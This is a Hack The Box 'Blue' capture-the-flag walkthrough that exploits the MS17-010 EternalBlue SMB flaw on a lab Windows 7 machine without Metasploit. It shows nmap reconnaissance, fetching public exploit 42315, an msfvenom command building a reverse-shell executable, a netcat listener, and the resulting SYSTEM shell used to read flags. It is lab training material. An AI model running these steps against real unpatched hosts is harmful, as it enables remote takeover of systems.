Hack The Box - Blue Walkthrough without Metasploit

# Reconnaissance
First we start by running nmap against the target
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/Blue]
└─$ sudo nmap -sC -sV -O -oA nmap-inital 10.10.10.40
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-08 04:54 EST
Nmap scan report for 10.10.10.40
Host is up (0.18s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008
OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
OS details: Microsoft Windows Server 2008 SP1
Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-01-08T09:56:09
|_  start_date: 2023-01-08T09:39:46
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-08T09:56:08+00:00
|_clock-skew: mean: 3s, deviation: 1s, median: 2s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.66 seconds
                                                
```

We get back the following result showing that nine ports are open:
- Port `139`: running Microsoft Windows `netbiois-ssn`
- Port `445`: running `microsoft-ds`
- Ports `135`, `49152`, `49153`, `49154`, `49155`, `49156` & `49157`: running `msrpc`

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```
sudo nmap -sC -sV -O -p- -oA nmap-full 10.10.10.40
```
We get back the following result. No other ports are open.

Similarly, we run an nmap scan with the `-sU` flag enabled to run a UDP scan (for top 1000 ports).

```
sudo nmap -sU -O -p- -oA udp 10.10.10.40
```

## Enumeration
As usual, we’ll run the general nmap `vulnerability scan scripts` to determine if any of the services are vulnerable.

```
sudo nmap --script vuln -oA vuln 10.10.10.40
```

The box is vulnerable to `EternalBlue`! And guess what the `EternalBlue exploit` does? It gives us system access, so this box won’t be too difficult to solve. If you’re not familiar with `EternalBlue`, it exploits Microsoft’s implementation of the `Server Message Block` (SMB) protocol, where if an attacker sent a specially crafted packet, the attacker would be allowed to `execute arbitrary code` on the target machine.

## Exploitation

Search for a non Metasploit exploit in the Exploit Database.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/Blue]
└─$ searchsploit --id MS17-010
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  EDB-ID
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010) | 43970
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                             | 41891
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                          | 42031
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                      | 42315
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                | 42030
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                             | 41987
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
               
```

We’re working with Windows 7 so we’ll use exploit # 42315. Clone the exploit into the working directory.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/Blue]
└─$ searchsploit -m 42315

  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
      URL: https://www.exploit-db.com/exploits/42315
     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/Desktop/HackTheBox/Beginner-Path/Blue/42315.py
```
Rename the copied file to `mysmb.py` for convinience

After looking at the `source code`, we need to do three things:

```
1. Download mysmb.py since the exploit imports it. The download location is included in the exploit.
2. Use MSFvenom to create a reverse shell payload (allowed on the OSCP as long as you’re not using meterpreter).
3. Make changes in the exploit to add the authentication credentials and the reverse shell payload.
```

Using `MSFvenom` to generate a simple executable with a reverse shell payload.

```
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=<Your I.P> LPORT=4444 > eternal-blue.exe
```

Then,  we need change the exploit to add credentials. In our case we don’t have valid credentials, however, let’s check to see if guest login is allowed

If you run `enum4linux`, you can see that no login credential is reuired.

```
enum4linux -a 10.10.10.40
```

![blue-1](https://user-images.githubusercontent.com/87711310/211190472-64299661-bae4-4d88-8a76-a587525d0884.png)

Similarly, we’ll add the reverse shell executable location and get the script to execute it.

![blue-2](https://user-images.githubusercontent.com/87711310/211190648-8f9b27de-44fc-45bc-9710-23b3c179a4cd.png)


Now that we’re done all three tasks, setup a listener on your attack machine.
```
nc -nlvp 4444
```
Then run the exploit.

```
python 42315.py 10.10.10.40
```

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Beginner-Path/Blue]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Grabbing the user flag.
```
C:\Windows\system32>type C:\Users\haris\Desktop\user.txt
type C:\Users\haris\Desktop\user.txt
[REDACTED]
```

Grabbing the root flag.
```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
[REDACTED]
```

